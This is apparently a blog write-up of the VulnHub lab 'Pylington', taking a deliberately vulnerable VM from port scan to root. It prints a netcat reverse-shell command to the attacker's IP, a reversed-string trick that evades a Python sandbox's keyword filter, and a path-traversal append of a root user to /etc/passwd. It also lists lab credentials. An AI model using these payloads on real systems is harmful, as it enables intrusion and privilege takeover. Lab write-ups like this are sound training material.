---
layout: post
title:  "Pylington - VulnHub"
---

## VulnHub - Pylington

## Port Scan

```bash
sudo nmap -sS -A -O 10.0.2.240
```

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.5
80/tcp open  http    Apache httpd 2.4.46 ((Unix) mod_wsgi/4.7.1 Python/3.9)
|_http-generator: Jekyll v4.1.1
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries
|_/register /login /zbir7mn240soxhicso2z
```
<br>

As we see nmap found the `robots.txt` with 3 disallowed entries

1. /register
2. /login
3. /zbir7mn240soxhicso2z

Let's investigate them

![image]( /assets/img/pylington/1.PNG)

So the `/zbir7mn240soxhicso2z` gave us these Credentials :

```
Username: steve
Password: bvbkukHAeVxtjjVH
```

## Login

Login requires to solve a math problem, using python `eval()` you can solve it

![image]( /assets/img/pylington/2.PNG)

## Playing with code

I tried to spawn a reverse shell using :

```python
__import__('os').system('nc -e /bin/sh 10.0.2.15 4444')
```
But the website detected my malicious code
And gave me this message :  `H4CK3R AL3R7!!! Malicious program detected by the sandbox`

![image]( /assets/img/pylington/4.PNG)

We are lucky because the developer provide us the code of the sandbox

![image]( /assets/img/pylington/5.PNG)

Let's read it

```
wget http://10.0.2.240/noimportos_sandbox.py
```

```sh
cat noimportos_sandbox.py
```

```python
def check_if_safe(code: str) -> bool:
    if 'import' in code: # import is too dangerous
        return False
    elif 'os' in code: # os is too dangerous
        return False
    elif 'open' in code: # opening files is also too dangerous
        return False
    else:
        return True
```

we are not allowed to use `import` , `os` and `open` in our code

## Bypass Python sandbox

After a google Searching if found this nice article : [python-sandbox-escape](https://programmer.help/blogs/python-sandbox-escape.html)
I use the below code :

```python
exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
```

#### Reverse order | Explanation of the exploit

The `noimportos_sandbox.py` checks the input string if contains these 3 strings : `import` , `os` and `open`

We can simple execute these disallowed values using the reverse order,
For example the

```python
tropmi[::-1] == import
```

Our stealth code is :

```python
exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
```

equals to :

```python
exec('import os; os.system("whoami")')
```

![image]( /assets/img/pylington/6.PNG)


## Reverse Shell

First i need to change my malicious code to reverse order

![image]( /assets/img/pylington/7.PNG)

```sh
4444 51.2.0.01 hs/nib/ e- cn
```

**Malicious code**

```python
exec(')"4444 51.2.0.01 hs/nib/ e- cn"(metsys.so ;so tropmi'[::-1])
```

**Listener**

```sh
nc -lvp 4444
```

#### It works | we are in

![image]( /assets/img/pylington/8.PNG)

## Privileges Escalation | User py

Find SUID permissions

```sh
[http@archlinux ~]$ find / -perm -u=s -type f 2>/dev/null
...
/home/py/typing
...
[http@archlinux ~]$
```

Let's check the `/home/py/typing`

```sh
[http@archlinux py]$ /home/py/typing
/home/py/typing
Let's play a game! If you can type the sentence below, then I'll tell you my password.

the quick brown fox jumps over the lazy dog
the quick brown fox jumps over the lazy dog # I typed the same sentence and it gave me the password
the quick brown fox jumps over the lazy dog
54ezhCGaJV
```

#### SSH login as user py

Credentials :  `py` : `54ezhCGaJV`

```zsh
┌──(alienum㉿kali)-[~]
└─$ ssh py@10.0.2.240
py@10.0.2.240s password:
Last login: Mon Apr 19 20:50:30 2021 from 10.0.2.15
[py@archlinux ~]$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
[py@archlinux ~]$
```

![image]( /assets/img/pylington/9.PNG)


## Root

Find SUID permissions

```sh
[py@archlinux ~]$ find / -perm -u=s -type f 2>/dev/null
...
/home/py/secret_stuff/backup
...
[py@archlinux ~]$
```

We focus to `/home/py/secret_stuff/backup`
First we will read the c++ source code of the backup to understand `/home/py/secret_stuff/backup.cc`

```cpp
#include <iostream>
#include <string>
#include <fstream>

int main(){
    std::cout<<"Enter a line of text to back up: ";
    std::string line;
    std::getline(std::cin,line);
    std::string path;
    std::cout<<"Enter a file to append the text to (must be inside the /srv/backups directory): ";
    std::getline(std::cin,path);

    if(!path.starts_with("/srv/backups/")){
        std::cout<<"The file must be inside the /srv/backups directory!\n";
    }
    else{
        std::ofstream backup_file(path,std::ios_base::app);
        backup_file<<line<<'\n';
    }

    return 0;


}
```

#### Explanation

First of all,
We can run The script `/home/py/secret_stuff/backup` with root permissions

The snippet :

```cpp
std::cout<<"Enter a line of text to back up: ";
std::string line;
std::getline(std::cin,line);
```
Allow us to insert what even string we want

The line `if(!path.starts_with("/srv/backups/")){` checks only if the path that we inserted starts with `/srv/backups/`
What about with the rest ???

## Writing a user to /etc/passwd

#### Create a password

```sh
┌──(alienum㉿kali)-[~]
└─$ openssl passwd -1
Password:
Verifying - Password:
$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1
```

#### The whole string

```
alienum:$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1:0:0::/root:/bin/bash
```

#### Final Step

Because the script checks only the starting string we can file inclusion the ```/srv/backups/../../etc/passwd```
<br>
So, i typed :
<br>
```
alienum:$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1:0:0::/root:/bin/bash
```

```
/srv/backups/../../etc/passwd
```


```sh
[py@archlinux secret_stuff]$ ./backup
Enter a line of text to back up: alienum:$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1:0:0::/root:/bin/bash
Enter a file to append the text to (must be inside the /srv/backups directory): /srv/backups/../../etc/passwd
[py@archlinux secret_stuff]$ su alienum
Password:
[root@archlinux secret_stuff]# id
uid=0(root) gid=0(root) groups=0(root)
[root@archlinux secret_stuff]#
```

The `/etc/passwd` looks like this :

```bash
root:x:0:0::/root:/bin/bash
py:x:1000:1000::/home/py:/bin/bash
alienum:$1$OFv8605C$Ijg./7PjFUq2HdzInVpFS1:0:0::/root:/bin/bash
```

![image]( /assets/img/pylington/10.PNG)
